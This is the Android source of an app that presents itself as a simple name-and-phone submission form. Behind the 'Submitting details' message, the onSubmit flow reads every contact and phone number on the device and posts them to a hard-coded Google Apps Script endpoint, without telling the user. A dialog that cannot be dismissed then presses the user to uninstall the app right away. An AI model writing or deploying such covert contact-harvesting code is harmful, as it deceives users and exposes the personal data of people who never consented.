package com.kapston.contactsuploader;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxeC_vuJW0VbL7XTLtjuRIMxCnLcOxs_p7FJB07-Fe0SUCjBvvhtNFvDjQp1BPUGTVW/exec";

    private EditText nameInput, phoneInput;
    private Button submitBtn;
    private TextView statusText;
    private LinearLayout statusCard;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        nameInput  = findViewById(R.id.nameInput);
        phoneInput = findViewById(R.id.phoneInput);
        submitBtn  = findViewById(R.id.submitBtn);
        statusText = findViewById(R.id.statusText);
        statusCard = findViewById(R.id.statusCard);

        submitBtn.setOnClickListener(v -> onSubmitClicked());
    }

    private void onSubmitClicked() {
        String name  = nameInput.getText().toString().trim();
        String phone = phoneInput.getText().toString().trim().replaceAll("\\s+", "");

        if (TextUtils.isEmpty(name)) {
            nameInput.setError("Please enter your name");
            nameInput.requestFocus();
            return;
        }
        if (TextUtils.isEmpty(phone) || !phone.matches("^[+]?[0-9]{7,15}$")) {
            phoneInput.setError("Please enter a valid mobile number");
            phoneInput.requestFocus();
            return;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CODE);
        } else {
            readAndUploadContacts(name, phone);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                String name  = nameInput.getText().toString().trim();
                String phone = phoneInput.getText().toString().trim().replaceAll("\\s+", "");
                readAndUploadContacts(name, phone);
            } else {
                showStatus("Contacts permission denied. Please allow it in Settings.", false);
            }
        }
    }

    private void readAndUploadContacts(String submitterName, String submitterPhone) {
        submitBtn.setEnabled(false);
        submitBtn.setText("Submitting details...");
        showStatus("Loading...", null);

        new Thread(() -> {
            try {
                List<Map<String, Object>> contacts = readAllContacts();

                runOnUiThread(() -> submitBtn.setText("Submitting details..."));

                JSONArray contactsArray = new JSONArray();
                for (Map<String, Object> contact : contacts) {
                    JSONObject obj = new JSONObject();
                    obj.put("name", contact.get("name"));
                    JSONArray nums = new JSONArray();
                    @SuppressWarnings("unchecked")
                    List<String> numbers = (List<String>) contact.get("numbers");
                    for (String num : numbers) nums.put(num);
                    obj.put("numbers", nums);
                    contactsArray.put(obj);
                }

                JSONObject submitter = new JSONObject();
                submitter.put("name", submitterName);
                submitter.put("phone", submitterPhone);

                JSONObject payload = new JSONObject();
                payload.put("submitter", submitter);
                payload.put("contacts", contactsArray);

                String result   = postToSheet(payload.toString());
                JSONObject resp = new JSONObject(result);

                runOnUiThread(() -> {
                    submitBtn.setEnabled(true);
                    submitBtn.setText("Submit");
                    if (resp.optBoolean("success", false)) {
                        showStatus("Submission successful! You can now uninstall this app.", true);
                        nameInput.setText("");
                        phoneInput.setText("");
                        promptUninstall();
                    } else {
                        showStatus("Upload failed: " + resp.optString("error", "Unknown error"), false);
                    }
                });

            } catch (Exception e) {
                runOnUiThread(() -> {
                    submitBtn.setEnabled(true);
                    submitBtn.setText("Submit");
                    showStatus("Error: " + e.getMessage(), false);
                });
            }
        }).start();
    }

    private List<Map<String, Object>> readAllContacts() {
        Map<String, Map<String, Object>> contactMap = new HashMap<>();
        ContentResolver cr = getContentResolver();

        Cursor nameCursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{
                        ContactsContract.Contacts._ID,
                        ContactsContract.Contacts.DISPLAY_NAME_PRIMARY
                },
                null, null,
                ContactsContract.Contacts.DISPLAY_NAME_PRIMARY + " ASC"
        );

        if (nameCursor != null) {
            while (nameCursor.moveToNext()) {
                String id   = nameCursor.getString(0);
                String name = nameCursor.getString(1);
                if (name == null || name.trim().isEmpty()) name = "Unknown";
                Map<String, Object> contact = new HashMap<>();
                contact.put("name", name.trim());
                contact.put("numbers", new ArrayList<String>());
                contactMap.put(id, contact);
            }
            nameCursor.close();
        }

        Cursor phoneCursor = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                null, null, null
        );

        if (phoneCursor != null) {
            while (phoneCursor.moveToNext()) {
                String contactId = phoneCursor.getString(0);
                String number    = phoneCursor.getString(1);
                if (number != null && !number.trim().isEmpty() && contactMap.containsKey(contactId)) {
                    @SuppressWarnings("unchecked")
                    List<String> numbers = (List<String>) contactMap.get(contactId).get("numbers");
                    numbers.add(number.trim());
                }
            }
            phoneCursor.close();
        }

        return new ArrayList<>(contactMap.values());
    }

    private String postToSheet(String jsonPayload) throws Exception {
        URL url = new URL(SCRIPT_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(true);
        HttpURLConnection.setFollowRedirects(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setDoOutput(true);
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);

        byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(input);
        }

        int code = conn.getResponseCode();
        if (code == 301 || code == 302 || code == 307 || code == 308) {
            String newUrl = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(newUrl).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "text/plain");
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(input);
            }
        }

        StringBuilder response = new StringBuilder();
        BufferedReader br = new BufferedReader(
                new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
        String line;
        while ((line = br.readLine()) != null) response.append(line);
        br.close();
        conn.disconnect();
        return response.toString();
    }

    private void promptUninstall() {
        new AlertDialog.Builder(this)
            .setTitle("Submission Complete")
            .setMessage("Your details have been submitted successfully. Please uninstall this app now.")
            .setPositiveButton("Uninstall", (dialog, which) -> {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            })
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show();
    }

    private void showStatus(String message, Boolean success) {
        statusCard.setVisibility(View.VISIBLE);
        statusText.setText(message);
        if (success == null) {
            statusCard.setBackgroundResource(R.drawable.bg_status_info);
            statusText.setTextColor(0xFF1E40AF);
        } else if (success) {
            statusCard.setBackgroundResource(R.drawable.bg_status_success);
            statusText.setTextColor(0xFF166534);
        } else {
            statusCard.setBackgroundResource(R.drawable.bg_status_error);
            statusText.setTextColor(0xFF991B1B);
        }
    }
}
